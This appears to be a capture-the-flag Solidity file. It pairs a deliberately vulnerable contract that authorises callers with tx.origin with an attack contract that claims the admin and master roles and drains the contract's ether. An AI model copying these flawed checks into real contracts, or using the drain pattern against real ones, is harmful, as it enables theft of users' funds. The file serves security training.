// Props to band0x for this amazing CTF
// I think we could upload this one as is, unless someone thinks otherwise
// SPDX-License-Identifier: UNLICENSED
pragma solidity 0.8.11;

contract N5BecomeMaster {
    mapping(address => uint256) allocations;
    address public admin;
    address public master;
    address caller;

    constructor() payable {
        master = msg.sender;
    }

    modifier onlyMaster() {
        require(master == tx.origin, "caller is not the master");
        _;
    }
    modifier onlyContract() {
        require(msg.sender != tx.origin, "caller is not the master");
        _;
    }
    modifier onlyAdmin() {
        require(admin == tx.origin, "caller is not the Admin");
        _;
    }

    function allocate() public payable {
        allocations[caller] = allocations[caller] += (msg.value);
        admin = tx.origin;
    }

    function sendAllocation(address payable allocator) public {
        require(allocations[allocator] > 0);
        allocator.transfer(allocations[allocator]);
    }

    function takeMasterRole() public onlyAdmin onlyContract {
        master = admin;
    }

    function collectAllocations() public onlyMaster onlyContract {
        payable(msg.sender).transfer(address(this).balance);
    }

    function allocatorBalance(address allocator) public view returns (uint256) {
        return allocations[allocator];
    }
}

contract N5Attack {
    N5BecomeMaster public n5;

    constructor (address _n5) payable {
        n5 = N5BecomeMaster(_n5);
    }

    function attack() public {
        n5.allocate{value: 1 ether}();
        // n5.sendAllocation(payable(address(this)));
        n5.takeMasterRole();
        n5.collectAllocations();
    }

    receive() external payable {}
}
